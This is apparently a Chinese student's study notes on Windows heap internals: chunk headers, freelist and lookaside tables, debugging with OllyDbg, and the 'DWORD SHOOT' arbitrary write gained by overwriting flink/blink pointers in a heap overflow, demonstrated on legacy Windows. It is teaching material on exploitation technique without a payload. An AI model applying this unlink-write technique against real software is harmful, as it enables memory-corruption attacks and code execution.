​		实用的 shellcode 通常需要超过 200 甚至 300 字节的机器码，所以对原始的二进制 shellcode 进行编码或压缩是很值得的。上节实验中在搜索 API 函数名时，并没有在 shellcode 中存储原 始的函数名，而是使用了函数名的摘要。在需要的 API 比较多的情况下，这样能够节省不少 shellcode 的篇幅。

### 3.6.2选择恰当的hash算法





第4章 MetaSploit （MSF使用）



# （*重点） 第5章 堆溢出利用

## 5.1堆的工作原理

### 5.1.1堆与栈的区别

**程序在执行时需要两种不同类型的内存来协同配合。**

**一种是前面所讨论的系统栈。**栈空间是在程序设 计时已经规定好怎么使用，使用多少内存空间的。典型的栈变量包括函数内部的普通变量、数 组等。栈变量在使用的时候不需要额外的申请操作，系统栈会根据函数中的变量声明自动在函 数栈帧中给其预留空间。栈空间由系统维护，它的分配（如 sub esp ，xx ;）和回收（如 add esp， xxx）都由系统来完成，最终达到栈平衡。所有的这些对程序员来说都是透明的。

**另外一种内存就是本章将讨论的堆。从程序员的角度来看，堆具备以下特性。**

（1）堆是一种在程序运行时动态分配的内存。所谓动态是指所需内存的大小在程序设计时 不能预先决定，需要在程序运行时参考用户的反馈。 

（2）堆在使用时需要程序员用专用函数进行申请，如 C 语言中的 malloc 等函数、C++中的 new 函数等都是最常见的分配堆内存的函数。堆内存申请有可能成功，也有可能失败，这与申请内存的大小、机器性能和当前运行环境有关。 

（3）一般用一个堆指针来使用申请得到的内存，读、写、释放都通过这个指针来完成。 

（4）使用完毕后需要把堆指针传给堆释放函数回收这片内存，否则会造成内存泄露。典型的释放函数包括 free、delete 等。

**堆内存与栈内存的比较**如表 5-1-1 所示

![image-20220407210415762](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220407210415762.png)

### 5.1.2堆的数据结构与管理策略 

程序员在使用堆时只需要做三件事情：**申请一定大小的内存，使用内存，释放内存。**

对于堆管理系统来说，响应程序的内存使用申请就意味着要在**“杂乱**”的堆区中**“辨别”** 出哪些内存是正在被使用的，哪些内存是空闲的，并最终“寻找”到一片“**恰当”**的空闲内存 区域，以指针形式返回给程序。 

（1）**“杂乱**”是指堆区经过反复的申请、释放操作之后，原本大片连续的空闲内存区可能 呈现出大小不等且空闲块、占用块相间隔的凌乱状态。 

（2）**“辨别”**是指堆管理程序必须能够正确地识别哪些内存区域是正在被程序使用的占用块，哪些区域是可以返回给当前请求的空闲块。 

（3）**“恰当**”是指堆管理程序必须能够比较“经济”地分配空闲内存块。如果用户申请使 用 8 个字节，而返回给用户一片 512 字节的连续内存区域并将其标记成占用状态，这将造成大 量的内存浪费，以致出现明明有内存却无法满足申请请求的情况。

### 5.1.3堆的数据结构

现代操作系统的堆数 据结构一般包括堆块和堆表两类。

##### 堆块

出于性能的考虑，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不 是传统的按字节标识。一个堆块包括两个部分：块首和块身。

**块首**是一个堆块头部的几个字节， 用来标识这个堆块自身的信息，例如，本块的大小、本块空闲还是占用等信息；

**块身**是紧跟在 块首后面的部分，也是最终分配给用户使用的数据区

根据堆块是否被占用分为**占用态堆块和空闲态堆块**。

###### 占用态堆块

![image-20220411201300483](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220411201300483.png)

Self Size：块整体的大小，包括块首和块身的大小   **占两个字节大小**

Previous chunk size：上一个块的大小     **占两个字节的大小**

Segment Index：段索引

Flags：标志位，用于标志块的状态，即空闲态，占用态等等  01 表示忙

Unused bytes：？？？？？？？？？？？？？？？？

###### 空闲态堆块

![image-20220411201700675](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220411201700675.png)

空闲态堆块和占用态堆块的块首结构基本一致，只是将块首**后数据区的前 8 个字节**用于存 放空表指针了，如图 5.2.9 所示。这 8 个字节在变回占用态时将重新分回块身用于存放数据。

**Flink in freelist  前向指针（指向前驱节点）		4个字节**

​												**原因可能是头插法导致，多加理解**

**Blink in freelist  后向指针 （指向后继节点）  		  4个字节**		

##### 堆表：

**堆表**一般位于堆区的起始位置**，用于索引堆区中所有堆块**的重要信息，包括堆块的位置、堆块的大小、空闲还是占用等。堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构 用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。

![image-20220407211752538](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220407211752538.png)

而堆表只索引所有空闲态的堆块。其 中，最重要的堆表有两种：**空闲双向链表** Freelist（以下简称**空表**）和**快速单向链表** Lookaside（以下简称**快表**）

###### 1．空表（空闲双向链表）

空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照**堆块的大小不同，空表总共被分为 128 条。**

 **堆区一开始的堆表区中有一个 128 项的指针数组，**被称做空表索引（Freelist array）。该数组的**每一项包括两个指针**（共8字节大小），用于标识一条空表

(起始地址为申请堆块的偏移 0x0178处 ，即free[0]  ，0x0180 free[1]，以此类推)  

如图 5.1.2 所示，空表索引的第二项（free[1]）标识了堆中所有大小为 8 字节的空闲堆块， 之后每个索引项指示的空闲堆块递增 8 字节，例如，free[2]标识大小为 16 字节的空闲堆块，free[3] 标识大小为 24 字节的空闲堆块，free[127]标识大小为 1016 字节的空闲堆块。          **因此有： 空闲堆块的大小＝索引项（ID）×8（字节） free[0]除外**

空表索引**的第一项（free[0]）**所标识的空表相对比较特殊。这条双向 链表链入了所有**大于等于 1024 字节的堆块**（小于 512KB）。这些堆块按照各自的大小在零号空表中升序地依次排列下去.

​           

![image-20220409105539172](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220409105539172.png)



###### 2.快表（**快速单 向链表** ）

​             **快表是 Windows 用来加速堆块分配而采用的一种堆表**。

这里之所以把它叫做“快表”是因 为**这类单向链表中从来不会发生堆块合并**（其中的空闲块块首被设置为占用态，用来防止堆块合并）

​		**快表也有 128 条，组织结构与空表类似**，只是**其中的堆块**按照**单链表**组织。**快表总是被初始化为空**，而且**每条快表最多只有 4 个结点**，故很快就会被填满。

![image-20220409110858894](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220409110858894.png)

### 5.1.4堆中的操作     (*重点)   

​         堆中的操作可以分为**堆块分配、堆块释放和堆块合并**（Coalesce）三种。其中，“分配”和 “释放”是在程序提交申请和执行的，而**堆块合并则是由堆管理系统自动完成**。

#### 1．堆块分配



堆块分配可以分为三类：**快表分配、普通空表分配和零号空表（freelist[0]）分配。**

- **快表分配**

​		从快表中分配堆块比较简单，包括寻找到大小匹配的空闲堆块、将其状态修改为占用态、 把它从堆表中“卸下”、最后返回一个指向堆块块身的指针给程序使用。

- **普通空表分配**

​		普通空表分配时首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配，即最小的能够满足要求的空闲块。

- **零号空表**

​			零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从 free[0]反向查找最后一 个块（即表中最大块），看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的 空闲堆块进行分配   （零号空表要按照升序排列的原因）



- ​	堆块分配中的**“找零钱”现象**：

​				当空表中无法找到匹配的“最优”堆块时，一个稍大些的 块会被用于分配。这种**次优分配发生时，会先从大块中按请求的大小精确地“割”出一块进行 分配**，然后给**剩下的部分重新标注块首，链入空表**。这里体现的就是**堆管理系统的“节约”原 则**：买东西的时候用最合适的钞票，如果没有，就要找零钱，决不会玩大方。 

​		**快表只有在精确匹配时才会分配，故不存在“找钱”现象。**



##### 堆分配函数之间的调用关系 ？？？

![image-20220409220622887](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220409220622887.png)

Customized Heap implementation  自定义堆实现

Libc Heap Management API 	 ？

NT Heap  Memory  API     		？



Windows 中提供了许多类型的堆分配函数，**所有的堆分配函数最终**都将**使用**位于 **ntdll.dll 中的 RtlAllocateHeap()函数进行分配**，这个函数也**是在用户态能够看到的最底层的堆分配函数**。所谓万变不离其宗，这个“宗”就是 RtlAllocateHeap()。因此，研究 Windows 堆只要研究这个函数即可。

它们之间的关系如图 5.2.2 所示

![image-20220409221654146](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220409221654146.png)

##### 堆的调试方法

**调试态**堆管理策略**和常态堆管理策略**有很大差异，集中体现在：

（1）**调试堆不使用快表**，只用空表分配。 

（2）所有堆块都被加上了**多余的 16 字节**尾部用来防止溢出（防止程序溢出而不是堆溢出 攻击），这包括 8 个字节的 0xAB 和 8 个字节的 0x00。 

（3）**块首的标志位**不同。



为了**避免程序**检测出调试器而**使用调试堆管理策略**，我们可以在创建堆之后加入一个人工断点：

**_asm int 3**，然后让程序单独执行。当程序把堆初始化完后，断点会中断程序，这时再用调试器 attach 进程，就能看到真实的堆。

也可以使用Ollydbg，将Ollydbg设置为 默认调试器，其步骤如下：

![image-20220411164633530](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220411164633530.png)

![image-20220411164644967](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220411164644967.png)

##### **调试代码**（空表）

winxp示例：

#include <windows.h> 
main() 
{ 
HLOCAL h1,h2,h3,h4,h5,h6; 
HANDLE hp; 	

​						

000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

*HLOCAL的定义就是typedef HANDLE HLOCAL    HLOCAL是HANDLE，也叫句柄，HANDLE就是void*

000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000



hp = HeapCreate(0,0x1000,0x10000);    

   	

1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111

*HeapCreate，计算机函数语言，指的是进程中创建辅助堆栈。*

***HANDLE HeapCreate**(DWORD flOptions , DWORD dwInitialSize , DWORD dwMaxmumSize);*

**第一参数 flOptions 表示对堆的操作如何进行，可以是0，HEAP_NO_SERIALIZE，HEAP_GENERATE_EXCEPTIONS，HEAP_CREATE_ENABLE_EXECUTE。*

***0代表什么？？？？？***

*HEAP_NO_SERIALIZE：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。*

*HEAP_GENERATE_EXCEPTIONS：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。*

*HEAP_CREATE_ENALBE_EXECUTE：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。*

*第二参数 	dwInitialSize表示开始时分给堆的字节数。*
*第三参数 	dwMaximumSize表示所能增长到的最大大小，如果指定为0的话，则堆可以在需要的情况下不断增大。*

11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111



__asm int 3   			 //人工加断点

h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,3); 
h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,5); 
h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,6); 
h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,19); 
h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24); 



222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222

*HeapAlloc是一个Windows [API函数](https://baike.baidu.com/item/API函数/9554990)。它用来在指定的堆上分配内存，并且分配后的内存不可移动。*

*HeapAlloc(_HANDLE hHeap, DWORD dwFlags,SIZE_T dwBytes)*

***参数***

*1.hHeap     要分配堆的句柄，可以通过HeapCreate()函数或GetProcessHeap()函数获得。*

*2.dwFlags   堆分配时的可选参数，其值可以为以下的一种或多种：*

*![image-20220410134731705](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220410134731705.png)*

*3.dwBytes     要分配堆的字节数。*

***返回值*** 

*如果成功分配内存，返回值为一个指向所分配内存块的首地址的（void）指针。*

*如果分配内存失败，并且没有指定HEAP_GENERATE_EXCEPTIONS，则返回NULL。*

*如果指定了HEAP_GENERATE_EXCEPTIONS，则抛出异常抛出异常，而不返回NULL：*

*![image-20220410135347025](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220410135347025.png)*

22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222



//free block and prevent coaleses 
HeapFree(hp,0,h1); //free to freelist[2] 
HeapFree(hp,0,h3); //free to freelist[2] 
HeapFree(hp,0,h5); //free to freelist[4] 
HeapFree(hp,0,h4); //coalesce h3,h4,h5,link the large block to freelist[8]

 

333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333

*HeapFree是一个Windows API函数。它用来释放堆内存.*

*BOOL HeapFree(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem);* 

***参数***

1. *hHeap*

*堆内存块释放。这个参数是HeapCreate或GetProcessHeap函数返回的句柄。*

2.   *dwFlags*

*指定几个可控释放的内存块。指定以下值将覆盖flOptions中指定参数对应的值,当堆是由使用HeapCreate函数。*

3.   *lpMem*

*被释放的内存块的指针。这HeapAlloc或HeapReAlloc函数返回的指针。如果这个指针为NULL,则为空。*



333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333

return 0; 
} 



![image-20220412093031612](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412093031612.png)

可看到程序在HeapCreate后在INT3处停了下来，堆创建返回地址存在寄存器EAX中，即为003A0000.

在OD的内存区通过快捷键Ctrl+G 查看此地址具体内存 ，内容如下：

![image-20220412094940303](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412094940303.png)

从 0x003a0000 开始，堆表中包含的信息依次是**段表索引（Segment List）、 虚表索引(Virtual Allocation list)、空表使用标识（freelist usage bitmap）和空表索引区**。 

我们最关心的是**偏移 0x178 处的空表索引区**，其余的堆表一般与堆溢出利用关系不大，这 里暂不讨论

堆初始化  空表

当一个**堆**刚**刚被初始化**时，它的**堆块状况是**非常简单的。 

（1）**只有一个空闲态的大块**，这个块被称做**“尾块**”,**位于堆偏移 0x0688 处**（启用快表后这个位置将是快表，此处不做深入）

（3）**Freelist[0**]指向“尾块”。 

（4）除零号空表索引外，其余**各项索引都指向自己**，这意味着其余所有的空闲链表中都没 有空闲块。

在内存区查看**“尾块”的具体情况** 如图：

![image-20220412100727807](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412100727807.png)

​		跟据前面堆块的分析，003A0688处为块首后面的数据区，因为此时该**尾块为空闲态**，所以数据区的前八个字节为两个指针，分别指向下一个节点和上一个节点，**003A0688前8个字节处为块首的起始**，即尾块的真正开始的地方。**总结**如下：

（1）实际上这个堆块开始于 0x003A0680，**一般引用堆块的指针都会跃过 8 字节的块首**，直接指向数据区。

（2）尾块目前的大小为 0x0130，计算单位是 8 个字节（一个堆块八个字节），也就是 0x980 字节。 

（3）注意：堆块的大小是包含块首在内的。

##### 堆块分配细节：

（1）堆块的大小包括了块首在内，即如果请求 32 字节，实际会分配的堆块为 40 字节：8 字节块首＋32 字节块身。 

（2）堆块的单位是 8 字节，不足 8 字节的部分按 8 字节分配。 

（3）**初始状态**下，**快表和空表**都为**空**，不存在精确分配。请求将使用“次优块”进行分配。 这个“次优块”就是位于偏移 0x0688 处的尾块。 

（4）由于次优分配的发生，**分配函数**会陆续从**尾块中**切走一些小块，并**修改尾块块首中的 size 信息**，最后把 freelist[0]指向新的尾块位置

##### 调试验证：

上述代码中堆句柄分配单位

![image-20220412110828796](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412110828796.png)

将程序执行到 **第一次 HeapAlloc函数以后**

（若调试时无法跳过人工int3指令时，可设置新的EIP方法：在想要执行的地址处 右键  点击  new origin here）

**分析**：

h1分配应从尾块（003a0680）中切割两个堆单位（16字节），前两个字节应该为0002.

切割后尾块的新地址就应该为003a0690，而且大小应该变为012e。                                                   		

尾块中数据区前8字节（003a0698处）应该指向空表索引的freelist[0]（003a0178）处，而freelist[0]应该指向尾块的数据区即003a0698。

**调试结果如图：**

![image-20220412112015446](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412112015446.png)

![image-20220412112058702](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412112058702.png)



后面堆分配按照以上步骤依次分析，可知原始的尾块一共分配了16个堆单位，尾块的起始地址变为0x003a0700，大小变为 0x120，freelist[0]指向 0x003a0708（此时[0]中只有一个尾块，所以前驱后继都指向相同一个节点）如下图:

![image-20220412114058506](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412114058506.png)



![image-20220412114246506](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412114246506.png)



#### 2．堆块释放 

​		释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入堆表的头部，分配的时候也先从堆表开始位置拿。

 另外需要强调，快表最多只有 4 项。

##### 调试代码

上述代码中堆块释放的部分

HeapFree(hp,0,h1); //free to freelist[2] 
HeapFree(hp,0,h3); //free to freelist[2] 
HeapFree(hp,0,h5); //free to freelist[4] 

HeapFree(hp,0,h4); //coalesce h3,h4,h5,link the large block to freelist[8] 

​        由于前三次释放的堆块在内存中不连续，因此不会发生合并。按照其大小，h1 和 h3 所指 向的堆块应该被链入 freelist[2]的空表，h5 则被链入 freelist[4]。

##### 调试验证

**第一次 HeapFree（hp，0，h1）**，h1的大小为16字节，所以会链入freelist[2]（0x003a0188）,  所以freelist[2]中后继和前驱指针都指向 h1（链表只有一个元素），h1中数据区前8个字节中的两个指针也（0x003a0688）也应该指向freelist[2]。

调试结果如图

![image-20220412195536385](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412195536385.png)

![image-20220412195510320](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412195510320.png)

前三次堆释放分析和上述相同（不连续），因为**第四次涉及到合并**在堆块合并处分析

前三次释放后  h1 和 h3 所指 向的堆块应该被链入 freelist[2]的空表，h5 则被链入 freelist[4]。

**分析结果如下：**

![image-20220422110224492](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220422110224492.png)

**调试结果如图**：

![image-20220412201639286](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412201639286.png)

![img](file:///E:\qq\qq文件\166599381\Image\C2C\KXW(SYJ}$)9JFNJB_K8U2DE.png)



#### 3．堆块合并 

​		经过反复的申请与释放操作，堆区很可能变得“千疮百孔”，产生很多内存碎片。为了合理有效地利用内存，堆管理系统还要能够进行堆块合并操作，如图 5.1.4 所示。 

![image-20220409112441697](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220409112441697.png)

​			当**堆管理系统发现两个空闲堆块彼此相邻**的时候，就会**进行堆块合并操作**。 堆块合并包括将两个块从空闲链表中“卸下”、合并堆块、调整合并后大块的块首信息（如 大小等）、将新块重新链入空闲链表。

##### 调试代码

上述代码中堆块释放的部分

HeapFree(hp,0,h1); //free to freelist[2] 
HeapFree(hp,0,h3); //free to freelist[2] 
HeapFree(hp,0,h5); //free to freelist[4] 

**HeapFree(hp,0,h4); //coalesce h3,h4,h5,link the large block to freelist[8]** 

​        当第 4 次释放操作结束后，h3、h4、h5 这 3 个空闲块彼此相邻，这时会发生堆块合并操作。 首先这 3 个空闲块都将从空表中摘下，然后重新计算合并后新堆块的大小，最后按照合并 后的大小把新块链入空表。

​		在这里，h3、h4 的大小都是 2 个堆单位（16字节），h5 是 4 个堆单位，合并后的新块为 8 个堆单位，将被链入 freelist[8]。

##### 调试验证

分析： freelist[8]会指向合并后的数据区，即003a06a8，

合并后堆块的前两个字节应该为 0x0008（8个堆单位），而且合并后堆块数据区的前八个字节应指向freelist[8]（003a01b8）.  freelist[2]和freelist[4]也将会改变，因为在堆块合并时 h3和h5被摘下。

![image-20220422113935463](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220422113935463.png)

**调试结果如图**：

![image-20220412204332445](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412204332445.png)

**第四次释放前后对比**可看到与分析相同。

![image-20220412202454735](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412202454735.png)



#### 快表的使用

程序在使用快表之后堆结构也会发生一些变化，其中最为主要的变化是**“尾块”不在位于堆 0x0688** 偏移处了，这个位置被快表霸占。从**偏移 0x0178 处的空表索引区**也可以看出。

调试代码（快表）

#include <stdio.h> 
#include <windows.h> 
void main() 
{ 
 HLOCAL h1,h2,h3,h4; 
 HANDLE hp; 
 hp = HeapCreate(0,0,0);        //全为0的时候分配快表
 __asm int 3 

//初始时全为空只有一个尾块

 h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
 h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
 h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); 
 h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24); 

//给快表链入

 HeapFree(hp,0,h1); 
 HeapFree(hp,0,h2); 
 HeapFree(hp,0,h3); 
 HeapFree(hp,0,h4); 

//再次分配时，从快表中分配

 h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); 
 HeapFree(hp,0,h2); 
} 

​	如图：再执行完HeapCreat函数后，空表索引区（堆偏移0x0178）处可观察到freelist[0]不再是偏移0x0688。

![image-20220412225721360](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412225721360.png)

​		快表在初始化时为0，故在第一次heapalloc后返回的地址为003a1e90，可以知道是从尾块处分配来



经过四次alloc后 h1 h2 h3 h4 如下

![image-20220413100050947](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220413100050947.png)

经过四次free后，根据四个堆块大小我们可以知道，h1,h2 将会被插入到 Lookaside[2]中，h3 会被插入到 Lookaside[3]中，h4会被插入到 Lookaside[4]中，快表区状态，如下图  此时003a0688处为    Lookaside索引的起始

![image-20220412231709547](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220412231709547.png)



可以看到 003a06e8-003a0717  为Lookaside[2],003a0718-003a0737为Lookaside[3]    ……

​         

每个 Lookaside[ ] 占48字节    前四个字节为指向下一个的指针，通过两次**free可以看出是头插**，分配时也是从头部开始，可自行调试。

![image-20220413102418501](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220413102418501.png)

进入到003a1e88查看   

![image-20220413103201164](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220413103201164.png)

（1）块首中的标识位为 0x01，也就是这个堆块是 Busy 状态，这也是为什么快表中的堆块 不进行合并操作的原因，如上图 

（2）**块首只存指向下一堆块的指针，不存在指向前一堆块的指针**，如上图。



​		经过前面的释放操作后，快表已经非空了，此时如果我们再申请 8、16 或 24 字节大小空 间的时系统会从快表中给我们分配，所以程序中接下来申请 16 个字节空间时，系统会从 Lookaside[2]中卸载一个堆块分配给程序，同时修改 Lookaside[2]表头。

![image-20220413103937821](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220413103937821.png)

​				接下来的释放指令又会将 16 字节的堆块插入到 Lookaside[2]中，这个过程和我们前面介绍 的释放过程完全一致。

### windows堆块分配和释放的策略

在具体进行堆块分配和释放时，**根据操作内存大小**的不同，**Windows 采取的策略**也会有所不同。可以**把内存块按照大小分为三类：** 

**小块：SIZE<1KB 		大块：1KB≤SIZE<512KB 		 巨块：SIZE≥512KB**

对应的**分配和释放算法也有三类**

![image-20220409112913531](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220409112913531.png)

###  Windows 堆管理的几个要点        （再次强调）。 

（1）快表中的空闲块被设置为占用态，故不会发生堆块合并操作

（2）快表只有精确匹配时才会分配，不存在“搜索次优解”和“找零钱”现象。

（3）快表是单链表，操作比双链表简单，插入删除都少用很多指令。 

（4）综上所述，快表很“快”，故在分配和释放时总是优先使用快表，失败时才用空表。

（5）快表只有 4 项，很容易被填满，因此空表也是被频繁使用的。 综上所述，Windows 的堆管理策略兼顾了内存合理使用、分配效率等多方面的因素。

##  5.2堆溢出利用

​		堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是对链表的修改。例 如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也 可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新后的新块“链入”空表

​		所有“卸下”和“链入”堆块的工作都发生在链表中，如果我们能伪造链表结点的指针， 在“卸下”和“链入”的过程中就有可能获得一次读写内存的机会。

​	**堆溢出利用的精髓：**就是用精心构造的数据去**溢出下一个**堆块的**块首**，**改写**块首中的**前向指针**（flink）和**后向指针**（blink），然后**在分配、释放、合并等操作发生时**伺机获得一次向内存任意地址写入任意数据的机会。

### 5.2.1 DWORD SHOOT

​		把上面能够向内存任意位置写入任意数据的机会称为“DWORD SHOOT”。注意：DWORD SHOOT 发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹 （4 字节恶意数据）。

#### 1.原理

将一个结点从 双向链表中“卸下”的函数很可能是类似这样的。

``int remove (ListNode * node)` 
`{` 
`node -> blink -> flink = node -> flink;` 
`node -> flink -> blink = node -> blink;` 
`return 0;` 
}` 

 按照这个函数的逻辑，正常拆卸过程中链表的变化过程如图 5.3.1 所示。

![image-20220416122732308](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416122732308.png)

​		当**堆溢出发生**时，非法数据可以**淹没下一个堆块的块首**。这时，块首是可以被攻击者控制的，即块首中存放的前向指针（flink）和后向指针（blink）是可以被攻击者伪造的。当这个堆块被从双向链表中“卸下”时，node -> blink -> flink = node -> flink 将把伪造的 flink 指针值写入伪造的 blink 所指的地址中去，从而发生 DWORD SHOOT。这个过程如图 5.3.2 所示。

![image-20220416123813052](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416123813052.png)

假设两个节点  node0  和node1  利用node0溢出 淹没node1 中的flink 和 blink指针

node1中假的（自己利用堆溢出写入）  blink 和 flink  

再次alloc node1 时

node1->blink->flink = node1->flink

在 任意内存地址  中写入  4字节数据！！！！！！！！！！！

####  2.调试

#include <windows.h> 
main() 
{ 
HLOCAL h1, h2,h3,h4,h5,h6; 
HANDLE hp; 
hp = HeapCreate(0,0x1000,0x10000); 
h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 

_asm int 3              //used to break the process 

//free the odd blocks to prevent coalesing 
HeapFree(hp,0,h1); 
HeapFree(hp,0,h3); 
HeapFree(hp,0,h5); //now freelist[2] got 3 entries 

//will allocate from freelist[2] which means unlink the last entry (h5) 
h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
return 0; 
} 

![image-20220416125946587](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416125946587.png)

理论分析：

（1）程序首先创建了一个大小为 0x1000 的堆区，并从其中连续申请了 6 个大小为 8 字节 的堆块（加上块首实际上是 16 字节），这应该是从初始的大块中“切”下来的。 

（2）释放奇数次申请的堆块是为了防止堆块合并的发生。 

（3）三次释放结束后，freelist[2]所标识的空表中应该链入了 3 个空闲堆块，它们依次是 h1、 h3、h5。 

（4）再次申请 8 字节的堆块，应该从 freelist[2]所标识的空表中分配，这意味着最后一个堆 块 h5 被从空表中“拆下”。 

（5）如果我们手动修改 h5 块首中的指针，应该能够观察到 DWORD SHOOT 的发生。

在此次实验中堆的起始地址为**0x00360000**

![image-20220416143528229](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416143528229.png)

win2000中调试分析和查看：

![image-20220416144123318](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416144123318.png)

![image-20220416144008205](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416144008205.png)

双向链表示意图：**（0052   ---0036  ）**

![image-20220416144445225](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220416144445225.png)

​		直接在调试器中手动将 0x003606C8 处的前向指针改为 0x003606D8，后向指针改为 0x003606DC。

![image-20220422155541810](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220422155541810.png)

在分配过程中

![image-20220422155821976](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220422155821976.png)



在此节点中     003606DC为后项节点的前向指针（数据区前4字节）       

​						003606D8为前项节点的前项指针（数据区的前4字节，通过+4为后项指针）



经过调试查看到  **在003606dc处     先赋值为003606D8       后赋值为003606DC**

即 	先把  此节点 后项节点的前项指针改为此节点的前项指针

​	 	后把   此节点 前项节点的后项指针改为此节点的后项指针



​		以上只是引发DWORD SHOOT 的一种情况。事实上，堆块的分配、释放、合并操作都能引发 DWORD SHOOT（因为都涉及链表操作），甚至快表也可以被用来制造DWORD SHOOT。 由于其原理上基本一致，故不一一赘述，您可以利用本节的理论分析和调试技巧自己举一反三。



### 5.2.2利用DWORD SHOOT 代码植入

​		堆溢出的精髓是获得一个 DWORD SH OOT 的机会，所以，堆溢出利用的精髓也就是 DWORD SHOOT 的利用。

​		 与栈溢出中的“地毯式轰炸”不同，堆溢出更加精准，往往直接狙击重要目标。精准是 DWORD SHOOT 的优点，但“火力不足”有时也会限制堆溢出的利用，这样就需要选择最重 要的目标用来“狙击”。 		本节将首先介绍一些内存中常用的“狙击目标”，然后以修改 PEB 中的同步函数指针为例， 给出一个完整的利用堆溢出执行 shellcode 的例子。

​		 DWORD SHOOT 的常用目标（Windows XP SP1 之前的平台）大概可以概括为以下几类。

